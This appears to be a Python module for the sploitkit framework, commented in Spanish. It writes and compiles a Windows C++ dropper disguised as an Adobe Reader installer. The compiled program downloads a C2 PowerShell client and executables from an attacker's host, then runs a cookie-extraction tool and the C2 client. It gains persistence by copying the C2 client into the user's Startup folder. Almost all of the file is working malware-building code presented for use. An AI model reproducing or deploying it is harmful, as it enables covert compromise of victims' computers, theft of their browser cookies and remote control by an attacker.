from sploitkit import *
import os
import subprocess
import time

class saguaro(Module):
	""" Genera un exe que descarga otros ejecutables a un cliente desde un servidor.

	Author:  your name (your email)
	Version: 1.0
	"""

	#MODULE OPTIONS
	config  = Config({
        Option(
            'EXE_NAME',
            "Nombre del ejecutable.",
            True,
            #set_callback=lambda o: o.root._set_app_folder(),
        ): "mi_exe",
        Option(
            'LHOST',
            "Tu direccion IP.",
            True,
            #set_callback=lambda o: o.root._set_app_folder(),
        ): "0.0.0.0",
        Option(
            '',
            ".",
            True,
            #set_callback=lambda o: o.root._set_app_folder(),
        ): "mi_exe",
        Option(
            'DOWNLOAD_FILES',
            "Nombre de los archivos que se descargan al cliente separados por comas. Ej. a.exe,b.exe,c.exe,...",
            True,
            #set_callback=lambda o: o.root._set_app_folder(),
        ): "a.exe,b.exe,c.exe",
    })

	def run(self):
		parent_path = "Prueba/sourcecodes/"
		parent_webroot_path = "Prueba/webroot/"


		name     = ''.join(list(self.config.get('EXE_NAME')))
		lhost   = ''.join(list(self.config.get('LHOST')))
		exes     = ''.join(list(self.config.get('DOWNLOAD_FILES'))).split(',')

		#TEST ARGUMENTS
		exename = "adobereaderDC-202001320074.exe"
		lhost = "10.10.1.13"
		files = ['client.ps1','extrae.exe','ejecuta.exe']
	

		name = 'evil.cpp'
		fullname = parent_path+name
		outfile = parent_webroot_path + exename
		ps_script = files[0]
		file1 = files[1]
		file2 = files[2]

		DWL_FILES = '''
		#include <iostream>
		#include <winsock2.h>
		#include <windows.h>
		#include <string>
		#pragma comment(lib, "urlmon.lib")
		#include <lmcons.h>
		#include <cstring>
		#define LHOST "%s"
		#define PSSCRIPT "%s"
		#define EXEFILE1 "%s"
		#define EXEFILE2 "%s"
		using namespace std;
		//compilar: i686-w64-mingw32-g++ evil.cpp -o adobereaderDC-202001320074 -lwininet -lurlmon -static-libgcc -static-libstdc++ -Wall

		int main(void){
		  string ipaddr = LHOST;
		  char username[UNLEN+1];
		  DWORD username_len = UNLEN+1;
		  GetUserName(username, &username_len);
		  string user(username);
		  //DESCARGA CLIENTE C2 PS SCRIPT
		  string file_name = PSSCRIPT;
		  string dwnld_URL = "http://"+ipaddr+"/"+file_name;
		  string save_path = "C:\\\\Users\\\\" + user + "\\\\AppData\\\\Local\\\\Temp\\\\" + file_name;
		  printf("%%s", save_path.c_str());
		  HRESULT res = URLDownloadToFile(NULL, dwnld_URL.c_str(), save_path.c_str(), 0, NULL);
		  if(res == S_OK) {
		        printf("Ok\\n");
		    } else if(res == E_OUTOFMEMORY) {
		        printf("Buffer length invalid, or insufficient memory\\n");
		    } else if(res == INET_E_DOWNLOAD_FAILURE) {
		        printf("URL is invalid\\n");
		    } else {
		        printf("Other error: %%d\\n", res);
		    }
		  //DESCARGA EXE PARA EXTRAER COOKIES
		  file_name = EXEFILE1;
		  dwnld_URL = "http://"+ipaddr+"/"+file_name;
		  save_path = "C:\\\\Users\\\\" + user + "\\\\AppData\\\\Local\\\\Temp\\\\" + file_name;
		  URLDownloadToFile(NULL, dwnld_URL.c_str(), save_path.c_str(), 0, NULL);
		  //EXTRAE COOKIES
		  system(save_path.c_str());
		  //DESCARGA EXE PARA EJECUTAR CLIENTEC2
		  file_name = EXEFILE2;
		  dwnld_URL = "http://"+ipaddr+"/"+file_name;
		  save_path = "C:\\\\Users\\\\" + user + "\\\\AppData\\\\Local\\\\Temp\\\\" + file_name;
		  URLDownloadToFile(NULL, dwnld_URL.c_str(), save_path.c_str(), 0, NULL);//AGREGAR COPY TO STARTUP FOLDER.
		  //EJECUTA CLIENTE C2
		  system(save_path.c_str());
		  //PERSISTENCIA - T1060
		  string cmd = "COPY \\""   + save_path +  "\\" \\"C:\\\\Users\\\\" + user + "\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\"";
		  //printf("cmd: %%s\\n", cmd.c_str());
		  system(cmd.c_str());
		  return 0;
		}
		''' % (lhost,ps_script,file1,file2)
		print(DWL_FILES)
		
		f = open(fullname,"w")
		f.write(DWL_FILES)
		print("Archivo "+ fullname + " creado.")
		#i686-w64-mingw32-g++ evil.cpp -o adobereaderDC-202001320074 -lwininet -lurlmon -static-libgcc -static-libstdc++ -Wall
		args = ["i686-w64-mingw32-g++", fullname, "-o", outfile, "-lwininet","-lurlmon","-Wall","-static-libgcc", "-static-libstdc++"]
		print("{} {}".format(fullname, outfile))
		subprocess.Popen(args)
		print("Compilado {}".format(outfile))
